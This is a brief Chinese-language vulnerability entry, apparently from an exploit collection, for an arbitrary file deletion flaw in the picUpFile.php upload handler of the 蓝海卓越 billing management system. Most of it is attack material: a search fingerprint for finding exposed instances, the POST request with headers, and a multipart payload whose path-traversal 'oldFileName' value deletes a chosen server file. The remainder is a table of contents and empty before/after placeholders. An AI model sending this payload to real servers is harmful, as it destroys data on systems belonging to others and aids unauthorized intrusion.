# 蓝海卓越计费管理系统picUpLoad存在任意文件删除漏洞

- **系统**：蓝海卓越计费管理系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`title=="蓝海卓越计费管理系统"`
- **请求**：`POST /inc/picUpFile.php?upFileFoler=&upFileID=&viewID= HTTP/1.1`
- **关键头**：`Content-Length: 1447494`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryehA9evlv…`　`Cookie: PHPSESSID=lp91fvnja6f987dj7jmkjh5601`

**请求体 / payload**
```
------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="oldFileName"
../../../../../usr/local/usr-gui/test.php
------WebKitFormBoundaryehA9evlvumScbjSw
Content-Disposition: form-data; name="file"; filename="c.jpg"
Content-Type: image/jpeg
PNG
删除前\

删除后\
```

**其他**
- 蓝海卓越 计费管理系统picUpLoad存在任意文件删除漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝海卓越 计费管理系统